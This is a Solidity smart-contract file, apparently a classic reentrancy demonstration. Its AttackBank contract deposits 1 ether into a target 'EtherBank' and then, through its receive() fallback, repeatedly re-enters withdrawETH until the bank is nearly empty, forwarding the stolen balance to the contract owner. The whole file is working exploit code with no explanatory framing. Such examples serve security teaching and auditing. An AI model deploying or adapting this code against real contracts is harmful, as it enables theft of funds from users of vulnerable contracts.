// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

interface EtherBank {
    function depositETH() external payable;

    function withdrawETH() external;
}

contract AttackBank {
    EtherBank public immutable etherBank;
    address public owner;

    constructor(address _etherBankAddress) {
        owner = msg.sender;
        etherBank = EtherBank(_etherBankAddress);
    }

    function attack() external payable {
        etherBank.depositETH{value: 1 ether}();
        etherBank.withdrawETH();
    }

    receive() external payable {
        if (address(etherBank).balance > 1 ether) {
            etherBank.withdrawETH();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
